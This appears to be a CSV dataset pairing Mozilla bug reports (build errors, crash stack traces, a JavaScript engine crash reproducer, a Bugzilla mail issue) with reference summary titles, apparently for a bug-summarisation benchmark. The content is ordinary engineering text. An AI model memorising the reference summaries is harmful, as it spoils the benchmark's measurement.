bug.id,bug_report,ground_truth_summary
24433,"I didn't quite believe the first three runs on the tip of beta, because two of the slaves had hardly ever done anything before (2 and 50-odd runs lifetime), so I retriggered a bunch, and retriggered several on the previous push which had been green.  https://tbpl.mozilla.org/?tree=Mozilla-Beta&fromchange=93544fa24586&tochange=a46d688e46df&jobname=Panda.*tp4m says that something outside the tree caused us to become unable to run tp on Pandas on beta. Betting people are betting on bug 920757.  mozilla-beta is closed.",tpn on Pandas on mozilla-beta broken
24464,"With Ubuntu 11.04 (g++ 4.5.2 and GNU ld 2.21.0.20110327), I get this error when I try to compile Firefox:  c++ -fno-rtti -Wall -Wpointer-arith -Woverloaded-virtual -Wsynth -Wno-ctor-dtor-privacy -Wno-non-virtual-dtor -Wcast-align -Wno-invalid-offsetof -Wno-variadic-macros -Werror=return-type -Wno-long-long -fno-strict-aliasing -std=gnu++0x -pthread -pipe -fexceptions  -DDEBUG -D_DEBUG -DTRACING -g -fPIC -shared -Wl,-z,defs -Wl,-h,test.so -o test.so test.o === === If you get failures below, please file a bug describing the error === and your environment (compiler and linker versions), and use === --disable-elf-hack until this is fixed. === /home/jruderman/mozilla-central/objdir-ff-debug/build/unix/elfhack/elfhack -b test.so test.so: terminate called after throwing an instance of 'std::runtime_error'   what():  PT_GNU_RELRO segment doesn't start on a section start make[7]: *** [test.so] Aborted","elfhack fails with ""PT_GNU_RELRO segment doesn't start on a section start"""
24471,We need to update the Changes page for 2.20rc2 and 2.21.1.  Usually this is pretty easy. :-),Update Changes Page for 2.20rc2
24545,/home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:3470:23: error: unused variable 'contentOpener' [-Werror=unused-variable]   found by uplift simulation that simulates aurora as beta  https://treeherder.mozilla.org/logviewer.html#?job_id=83713900&repo=try,Perma Bustage when Aurora 54 moves to Beta in nsGlobalWindow.cpp:3470:23: error: unused variable 'contentOpener' [-Werror=unused-variable]
24564,"bl-bldxp01 is failing to test with output  Running MozillaAliveTest test ... Timeout = 45 seconds. Begin: Sat Jun  9 11:50:04 2007 cmd = c:/builds/tinderbox/Fx-Trunk/WINNT_5.1_Depend/firefox/firefox/firefox.exe -P default End:   Sat Jun  9 11:50:12 2007 ----------- Output from MozillaAliveTest -------------  ----------- End Output from MozillaAliveTest ---------  Error: firefox.exe: exited with status 5 MozillaAliveTest: test failed  This is after bug 383742 eating the storage for the tinderbox VM, and rhelmer disabling BreadkPad for bug 383861. The build does pass MozillaAliveTest on fx-win32-tbox.  When I try to run the 2007060904 build on Win XP then the crash reporter comes up but fails to submit a report. If I disable BreakPad using MOZ_CRASHREPORTER_DISABLE=1 then the Windows crash reporter appears but not Talkback. However, there are several reports from nightly testers that the build is fine on Vista, and single reports it's ok on XP & 2000.    http://forums.mozillazine.org/viewtopic.php?t=556878  I tried the previous build, http://hourly-archive.localgho.st/win32/20070608_0322_firefox-3.0a6pre.en-US.win32.zip and that starts up fine. Which gives a regression window of    http://hourly-archive.localgho.st/win32/20070609_0420_checkins.html  We (wildly??) speculating on IRC that this might be similar to bug 331404.",Windows 20070609 nightly doesn't start on some machines
24787,"The DNS rewrite (bug 205726) leaves NSPR not building on OpenVMS. In order to get it to build I need to no longer define ""struct addrinfo"" in _openvms.h.  I also need to define the environment variables GETADDRINFO and FREEADDRINFO so that the new code which does getenv() calls for these (only for OpenVMS) will work.  I'll post the patch next. Both files are OpenVMS specific and so shouldn't break anyone else.",Make new DNS code build/run on OpenVMS
24833,This bug was filed from the Socorro interface and is  report bp-e45070de-d043-4b7f-8a65-7957d0170619. ============================================================= Crashing Thread (14) Frame 	Module 	Signature 	Source 0 	ntdll.dll 	RtlpWaitOnCriticalSection 	 1 	ntdll.dll 	RtlpEnterCriticalSectionContended 	 2 	ntdll.dll 	RtlEnterCriticalSection 	 3 	msvp9dec.dll 	CFrameSurfaceAllocator::ReleaseDXVASurface(unsigned char) 	 4 	msvp9dec.dll 	CVP9SWinDXVAFrameManager::Invoke(IMFAsyncResult*) 	 5 	rtworkq.dll 	CSerialWorkQueue::OnReplyAsyncCallback::Release() 	 6 	ntdll.dll 	TppWorkpExecuteCallback 	 7 	ntdll.dll 	TppWorkerThread 	 8 	kernel32.dll 	BaseThreadInitThunk 	 9 	ntdll.dll 	RtlUserThreadStart  crash reports with this signature started regressing in frequency in 55.0a1 20170610030207 and subsequent builds. they all are from installations with an intel gpu and from firefox 64bit versions on windows 10 so far.  this would be the pushlog from 20170610030207 to the day before: https://hg.mozilla.org/mozilla-central/pushloghtml?startdate=2017-06-09&tochange=91dc9525c422f11041da33b008b14a8117ed9a40 some av/graphics bugs getting fixed in that timeframe:  https://bugzilla.mozilla.org/buglist.cgi?list_id=13640005&resolution=---&resolution=FIXED&resolution=INVALID&resolution=WONTFIX&resolution=DUPLICATE&resolution=WORKSFORME&resolution=INCOMPLETE&resolution=SUPPORT&resolution=EXPIRED&resolution=MOVED&chfieldto=2017-06-10&chfield=cf_status_firefox55&query_format=advanced&chfieldfrom=2017-06-09&chfieldvalue=fixed&component=Audio%2FVideo&component=Audio%2FVideo%3A%20MediaStreamGraph&component=Audio%2FVideo%3A%20Playback&component=Graphics&component=Graphics%3A%20Layers&component=Graphics%3A%20Text&component=Graphics%3A%20WebRender&product=Core,Crash in RtlpWaitOnCriticalSection | RtlpEnterCriticalSectionContended | RtlEnterCriticalSection | CFrameSurfaceAllocator::ReleaseDXVASurface
24856,"This prevents running chrome test, at least when using debug builds.  #0  0x00000032d7097581 in nanosleep () from /lib64/libc.so.6 #1  0x00000032d70973a4 in sleep () from /lib64/libc.so.6 #2  0x00002aaaaaaf4bad in ah_crap_handler (signum=6)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/toolkit/xre/nsSigHandlers.cpp:149 #3  0x00002aaaaaaf576c in nsProfileLock::FatalSignalHandler (signo=6) at nsProfileLock.cpp:216 #4  <signal handler called> #5  0x00000032d70305c5 in raise () from /lib64/libc.so.6 #6  0x00000032d7032070 in abort () from /lib64/libc.so.6 #7  0x00002aaaaadb017c in JS_Assert (s=<value optimized out>, file=<value optimized out>, ln=<value optimized out>)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsutil.cpp:63 #8  0x00002aaaaad83d2f in ReconstructPCStack (cx=0x3bd9620, script=0x39be860, target=0x39bee16 ""V"", pcstack=0x120e450)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsopcode.cpp:5200 #9  0x00002aaaaad8cd87 in DecompileExpression (cx=0x3bd9620, script=0x39be860, fun=0x2a4f8c0, pc=0x39bee16 ""V"")     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsopcode.cpp:5086 #10 0x00002aaaaad8d041 in js_DecompileValueGenerator (cx=0x3bd9620, spindex=0, v=7802996, fallback=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsopcode.cpp:4974 #11 0x00002aaaaad39857 in js_ReportValueErrorFlags (cx=0x3bd9620, flags=5, errorNumber=162, spindex=0, v=7802996,      fallback=0x0, arg1=0x0, arg2=0x0) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jscntxt.cpp:1340 #12 0x00002aaaaad7e943 in js_GetPropertyHelper (cx=0x3bd9620, obj=0x2bc0580, id=7802996, vp=0x7fff48a01e48, entryp=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsobj.cpp:3798 #13 0x00002aaaaad3235b in JS_GetUCProperty (cx=0x3bd9620, obj=0x2bc0580, name=<value optimized out>,      namelen=<value optimized out>, vp=0x7fff48a01e48) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsapi.cpp:3844 #14 0x00002aaab0b2c815 in nsWindowSH::GetProperty (this=<value optimized out>, wrapper=<value optimized out>, cx=0x3bd9620,      obj=0x2bc00c0, id=<value optimized out>, vp=0x7fff48a01e48, _retval=0x7fff48a01ba4)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/dom/src/base/nsDOMClassInfo.cpp:4633 #15 0x00002aaab0228cf2 in XPC_WN_Helper_GetProperty (cx=0x3bd9620, obj=0x2bc00c0, idval=7802996, vp=0x7fff48a01e48)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/xpconnect/src/xpcwrappednativejsops.cpp:954 #16 0x00002aaaaad7e810 in js_GetPropertyHelper (cx=0x3bd9620, obj=0x2bc00c0, id=7802996, vp=0x7fff48a01e48, entryp=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsobj.cpp:3755 #17 0x00002aaaaad623db in js_Interpret (cx=0x3bd9620) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:4682 #18 0x00002aaaaad6f897 in js_Invoke (cx=0x3bd9620, argc=3, vp=0x2752088, flags=0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:1324 #19 0x00002aaab021db98 in nsXPCWrappedJSClass::CallMethod (this=0xc6e300, wrapper=<value optimized out>, methodIndex=3,      info=0x6cfd60, nativeParams=0x7fff48a02380)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/xpconnect/src/xpcwrappedjsclass.cpp:1549 #20 0x00002aaaab28ba0a in PrepareAndDispatch (self=0x1ac8ea0, methodIndex=<value optimized out>, args=<value optimized out>,      gpregs=0x7fff48a02460, fpregs=0x7fff48a02490)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:151 #21 0x00002aaaab28ada7 in SharedStub ()     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/reflect/xptinfo/src/xptiprivate.h:384 #22 0x00002aaaab24573f in nsObserverList::NotifyObservers (this=0x130f0a8, aSubject=0x3bd8698,      aTopic=0x3194d10 ""download-manager-ui-done"", someData=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/ds/nsObserverList.cpp:128 #23 0x00002aaaab245eda in nsObserverService::NotifyObservers (this=<value optimized out>, aSubject=0x3bd8698,      aTopic=0x3194d10 ""download-manager-ui-done"", someData=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/ds/nsObserverService.cpp:181 #24 0x00002aaaab28acf7 in NS_InvokeByIndex_P (that=0x6bfa10, methodIndex=5, paramCount=3, params=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_linux.cpp:208 ---Type <return> to continue, or q <return> to quit--- #25 0x00002aaab0223cf8 in XPCWrappedNative::CallMethod (ccx=@0x7fff48a02990, mode=<value optimized out>)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/xpconnect/src/xpcwrappednative.cpp:2402 #26 0x00002aaab022920a in XPC_WN_CallMethod (cx=0x3bd9620, obj=0x683380, argc=3, argv=0x2752060, vp=0x7fff48a02b78)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/xpconnect/src/xpcwrappednativejsops.cpp:1477 #27 0x00002aaaaad6f822 in js_Invoke (cx=0x3bd9620, argc=3, vp=0x2752050, flags=2)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:1306 #28 0x00002aaaaad5df56 in js_Interpret (cx=0x3bd9620) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:5015 #29 0x00002aaaaad6f897 in js_Invoke (cx=0x3bd9620, argc=1, vp=0x2752038, flags=0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:1324 #30 0x00002aaaaad6fcea in js_InternalInvoke (cx=0x3bd9620, obj=0x2bc0580, fval=18063936, flags=0, argc=1, argv=0xb82970,      rval=0x7fff48a030d8) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsinterp.cpp:1381 #31 0x00002aaaaad260b4 in JS_CallFunctionValue (cx=0x3bd9620, obj=0x2bc0580, fval=18063936, argc=1, argv=0xb82970,      rval=0x7fff48a030d8) at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsapi.cpp:5235 #32 0x00002aaab0af6e7f in nsJSContext::CallEventHandler (this=0x2c466f0, aTarget=<value optimized out>,      aScope=<value optimized out>, aHandler=0x113a240, aargv=0x2b554b8, arv=0x7fff48a03240)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/dom/src/base/nsJSEnvironment.cpp:1985 #33 0x00002aaab0b06d12 in nsGlobalWindow::RunTimeout (this=0x1ec04f0, aTimeout=0x31a3fa0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/dom/src/base/nsGlobalWindow.cpp:7658 #34 0x00002aaab0b0b4da in nsGlobalWindow::TimerCallback (aTimer=<value optimized out>, aClosure=<value optimized out>)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/dom/src/base/nsGlobalWindow.cpp:7990 #35 0x00002aaaab27e1df in nsTimerImpl::Fire (this=0x309c400)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/threads/nsTimerImpl.cpp:420 #36 0x00002aaaab27ecfc in nsTimerEvent::Run (this=0x2aaabc01a170)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/threads/nsTimerImpl.cpp:512 #37 0x00002aaaab27aee1 in nsThread::ProcessNextEvent (this=0x66bf90, mayWait=1, result=0x7fff48a0339c)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/xpcom/threads/nsThread.cpp:510 #38 0x00002aaaab238793 in NS_ProcessNextEvent_P (thread=0x1385, mayWait=1) at nsThreadUtils.cpp:227 #39 0x00002aaab9df5212 in nsBaseAppShell::Run (this=0xd2a4d0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/widget/src/xpwidgets/nsBaseAppShell.cpp:170 #40 0x00002aaab7631771 in nsAppStartup::Run (this=0xd13d20)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/toolkit/components/startup/src/nsAppStartup.cpp:182 #41 0x00002aaaaaae9f75 in XRE_main (argc=<value optimized out>, argv=<value optimized out>, aAppData=<value optimized out>)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/toolkit/xre/nsAppRunner.cpp:3263 #42 0x0000000000400eca in main (argc=5, argv=0x0)     at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/browser/app/nsBrowserApp.cpp:156","JS Assertion when running chrome test, Assertion failure: OBJ_BLOCK_DEPTH(cx, obj) == pcdepth, at /home/smaug/mozilla/mozilla_cvs/hg/mozilla/js/src/jsopcode.cpp:5200"
24880,Changing the file path from VID_0001.3gp to for instance DCIM/VID_0001.3gp when calling cameraObj.startRecording results in an error callback.,Cant specify sub directories for videos in CameraControl API
24898,"Created attachment 564094 FF_fail.txt  User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1 Build ID: 20110928134238  Steps to reproduce:  Tried using a bookmarklet that worked fine in FF 6.x   Actual results:  FF crashes (tried in both W2K and 64 bit Win 7)   Expected results:  Should have worked - returns a link from within the XML document.   I think it fails at: document.replaceChild(f,document.firstChild)","crash nsXMLPrettyPrinter::Unhook ,  I believe document.replaceChild (in bookmarklet) crashes FF 7.x"
24950,"+[(e = {}, (function () e)()) for each (e in ["""", {}, """", {}, """"])][4];  Crash [@ js_ValueToNumber] touching 0x20000000  +[(e = {}, (function () e)()) for each (e in ["""", {}, """", {}, """"])];  Crash [@ JS_Enumerate] touching 0x20000000",TM: crash [@ js_ValueToNumber] or [@ JS_Enumerate]; corrupted array?
25069,"As far as I can tell security@mozilla.org is always mailed when a *new* bug is filed with the security group box checked. At least some of the time we're mailed when the group is UN-set, but there are several times I know of that I have gone to a newly filed security bug and found that the security group checkmark has been removed but no mail is ever received.  This makes me wonder if there are times when the group is set on non-new bugs that I'm not getting mail for, and of course not knowing when a bug goes public is itself a potentially bad thing.  Could this have something to do with UNCONFIRMED bugs? I don't know if this has always been true, but the recent ones that have exhibited this problem were all UNCO bugs. Could the security@mozilla.org account be set not to be mailed on UNCO bugs?  This problem *might* be since the recent BMO upgrade, I can't remember when I first started noticing this. It's possible it's been around longer and I only noticed recently now that a new member of the security group has started to help triage the incoming.",Not always mailed when security group removed
25175,"It's #14 top crasher in the first days of 13.0b1.  Signature 	msvcr100.dll@0x8af06 More Reports Search UUID	ac51f3e2-2c7e-4072-ab88-385122120428 Date Processed	2012-04-28 09:35:12 Process Type	plugin Version: Filename: NPSWF32_11_3_300_231.dll Uptime	3146 Install Age	1.8 days since version was first installed. Install Time	2012-04-26 14:42:11 Product	Firefox Version	13.0 Build ID	20120425123149 Release Channel	beta OS	Windows NT OS Version	6.1.7601 Service Pack 1 Build Architecture	x86 Build Architecture Info	GenuineIntel family 6 model 42 stepping 7 Crash Reason	EXCEPTION_NONCONTINUABLE_EXCEPTION Crash Address	0x0 App Notes 	 AdapterVendorID: 0x10de, AdapterDeviceID: 0x0dc6, AdapterSubsysID: 23621462, AdapterDriverVersion: 8.17.13.132 D2D? D2D+ DWrite? DWrite+ D3D10 Layers? D3D10 Layers+  EMCheckCompatibility	True  Frame 	Module 	Signature 	Source 0 	msvcr100.dll 	msvcr100.dll@0x8af06 	 1 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30541c 	 2 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x302fd5 	 3 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x3147c0 	 4 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30342f 	 5 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x305bb7 	 6 	user32.dll 	MsgWaitForMultipleObjects 	 7 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x318019 	 8 	KERNELBASE.dll 	WaitForSingleObjectEx 	 9 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x306549 	 10 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30511f 	 11 	ntdll.dll 	WinSqmSetIfMaxDWORD 	 12 	ntdll.dll 	RtlpLowFragHeapAllocFromContext 	 13 	ntdll.dll 	RtlAllocateHeap 	 14 	ntdll.dll 	RtlFreeHeap 	 15 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30706f 	 16 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x2fde02 	 17 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30ba1f 	 18 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30bd0f 	 19 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30a63d 	 20 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30e4eb 	 21 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x31ce16 	 22 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30cf77 	 23 	ntdll.dll 	NtClearEvent 	 24 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30ed68 	 25 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x7ba977 	 26 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x7ba917 	 27 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30f8a2 	 28 	ntdll.dll 	RtlAllocateHeap 	 29 	ntdll.dll 	RtlFreeHeap 	 30 	ntdll.dll 	RtlpLowFragHeapAllocFromContext 	 31 	ntdll.dll 	RtlAllocateHeap 	 32 	ntdll.dll 	RtlFreeHeap 	 33 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1cc36d 	 34 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1ccb4d 	 35 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1ccb4d 	 36 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1ccc51 	 37 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1ccd84 	 38 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x1ccd97 	 39 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x3150bd 	 40 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x3000db 	 41 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x3150ab 	 42 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30c2ed 	 43 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x30a54e 	 44 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x2fda52 	 45 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x2fd40c 	 46 	ntdll.dll 	RtlFreeHeap 	 47 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x670374 	 48 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x66dbb7 	 49 	NPSWF32_11_3_300_231.dll 	NPSWF32_11_3_300_231.dll@0x2fd8a7 	 50 	xul.dll 	mozilla::plugins::PluginModuleChild::AnswerPPluginInstanceConstructor 	dom/plugins/ipc/PluginModuleChild.cpp:2075 51 	xul.dll 	mozilla::plugins::PPluginModuleChild::OnCallReceived 	obj-firefox/ipc/ipdl/PPluginModuleChild.cpp:1099 52 	xul.dll 	mozilla::ipc::RPCChannel::DispatchIncall 	ipc/glue/RPCChannel.cpp:517 53 	xul.dll 	mozilla::ipc::RPCChannel::OnMaybeDequeueOne 	ipc/glue/RPCChannel.cpp:430 54 	xul.dll 	MessageLoop::RunTask 	ipc/chromium/src/base/message_loop.cc:318 55 	xul.dll 	MessageLoop::DeferOrRunPendingTask 	ipc/chromium/src/base/message_loop.cc:326 56 	xul.dll 	MessageLoop::DoWork 	ipc/chromium/src/base/message_loop.cc:426 57 	xul.dll 	base::MessagePumpForUI::DoRunLoop 	ipc/chromium/src/base/message_pump_win.cc:214 58 	xul.dll 	base::MessagePumpWin::RunWithDispatcher 	ipc/chromium/src/base/message_pump_win.cc:53 59 	xul.dll 	base::MessagePumpWin::Run 	ipc/chromium/src/base/message_pump_win.h:78 60 	xul.dll 	MessageLoop::RunInternal 	ipc/chromium/src/base/message_loop.cc:208 61 	xul.dll 	MessageLoop::RunHandler 	ipc/chromium/src/base/message_loop.cc:194 62 	xul.dll 	MessageLoop::Run 	ipc/chromium/src/base/message_loop.cc:175 63 	xul.dll 	XRE_InitChildProcess 	toolkit/xre/nsEmbedFunctions.cpp:513 64 	xul.dll 	XRE_StringToChildProcessType 	toolkit/xre/nsEmbedFunctions.cpp:244 65 	plugin-container.exe 	__tmainCRTStartup 	crtexe.c:552 66 	kernel32.dll 	BaseThreadInitThunk 	 67 	ntdll.dll 	__RtlUserThreadStart 	 68 	ntdll.dll 	_RtlUserThreadStart  More reports at: https://crash-stats.mozilla.com/report/list?signature=msvcr100.dll%400x8af06",[adbe 3517597] Flash crash in F_1522300002
25194,This bug was filed from the Socorro interface and is  report bp-3241a252-579c-412a-bf85-304372151003. =============================================================  Crash playing HTML video on a Galaxy S5.,crash in libhwui.so@0x426fe
25283,This bug was filed from the Socorro interface and is  report bp-782b17a4-5e34-4c14-adad-68bbb0170507. =============================================================  https://hg.mozilla.org/mozilla-central/annotate/37a5b7f6f101/dom/media/MediaShutdownManager.cpp#l77  AddBlocker() failed because main thread was shutting down.,Crash in mozilla::MediaShutdownManager::InitStatics
25295,"In Netscape 6.0 test blitz,  Browser crashed when hitting Ctrl+Shift+(Tab/Esc/Return/Copy/Del/F#/->/..) keys.  It was fine when hitting Ctrl+Shift+(Numbers/Letters).","Browser crashed when hit ""Ctrl+Shift+(Tab/Esc/Return/F#/->)key."
